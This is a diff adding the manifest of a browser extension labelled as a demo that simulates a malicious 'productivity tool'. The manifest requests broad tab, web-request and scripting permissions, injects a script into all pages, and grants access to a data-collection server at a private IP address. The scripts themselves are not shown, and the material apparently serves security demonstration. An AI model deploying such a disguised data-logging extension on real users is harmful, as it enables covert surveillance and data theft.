@@ -1,0 +1,24 @@
+{
+  "manifest_version": 3,
+  "name": "Fake Productivity Tool (Demo)",
+  "version": "1.0",
+  "description": "A demo extension simulating a malicious productivity tool that logs data to a server.",
+  "permissions": ["tabs", "storage", "webRequest", "scripting", "activeTab"],
+  "host_permissions": ["*://*/*", "https://192.168.153.136:8999/*"],
+  "background": {
+    "service_worker": "background.js"
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"]
+    }
+  ],
+  "action": {
+    "default_popup": "popup.html"
+  },
+  "icons": {
+    "48": "icon48.png",
+    "128": "icon128.png"
+  }
+}
